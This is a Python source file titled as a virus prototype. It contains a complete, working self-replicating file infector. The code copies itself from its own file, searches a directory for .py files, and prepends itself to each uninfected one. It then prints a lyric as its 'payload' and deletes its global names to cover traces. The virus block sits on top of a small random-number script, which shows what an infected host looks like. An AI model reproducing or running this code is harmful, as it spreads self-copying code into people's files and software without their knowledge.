# ============================================================
# Virus prototype in Python
# ============================================================

# begin-virus

# --------------------------------------------------------------
# Functions/methods part of the virus code

import glob
import re

def get_content_of_file(file):
    data = None
    with open(file, "r") as my_file:
        data = my_file.readlines()

    return data

def get_content_if_infectable(file):
    data = get_content_of_file(file)
    for line in data:
        if "# begin-virus" in line:
            # print ("DEBUG: file already infected: ", file)
            return None
    return data    

def get_virus_code():
    # Read the content of this or any infected file. 
    # Detect the virus part, save to variable and return.
    
    virus_code_on = False                                                          
    virus_code = []                                                                
                                                                                   
    code = get_content_of_file(__file__)                                           
                                                                                   
    for line in code:                                                              
        #print ("DEBUG: code line found: ",line)

        regexp = re.compile(r'# begin-virus[\r\n]')
        if regexp.search(line):        
            virus_code_on = True                                                   
                                                                                   
        if virus_code_on:                                                          
            # print ("DEBUG: virus code line found: ",line)
            virus_code.append(line)                                                
                                                                                   
        regexp = re.compile(r'# end-virus[\r\n]')
        if regexp.search(line):                
            virus_code_on = False                                                  
            break                                                                  
                                                                                   
    return virus_code   

def find_files_to_infect(directory = "./"):
    filelist = []
    for file in glob.glob(directory + "*.py"):
        filelist.append(file)
        #print ("DEBUG: File found: ", file)
    return filelist

def summon_chaos():
     # the virus payload
    print("We are sick, fucked up and complicated\nWe are chaos, we can't be cured")

def infect(file, virus_code):        
    if (data:=get_content_if_infectable(file)):
        with open(file, "w") as infected_file:
            # print ("DEBUG: Infecting file: ", file)
            infected_file.write("".join(virus_code))
            infected_file.writelines(data)        

# --------------------------------------------------------------
# Here starts the execution of the virus

try:
     # retrieve the virus code from the current infected script
     virus_code = get_virus_code() 
 
     # look for other files to infect
     for file in find_files_to_infect("test/"):
         infect(file, virus_code)         
     
     # call the payload
     summon_chaos()

# Better leave this in comments during development:
# except:
#   pass

finally:
    # delete used names from memory
    for i in list(globals().keys()):
        if(i[0] != '_'):
            exec('del {}'.format(i))

    del i

# end-virus

# --------------------------------------------------------------
# numbers.py 

import random

random.seed()

for _ in range(10):
    print (random.randint(0,100))

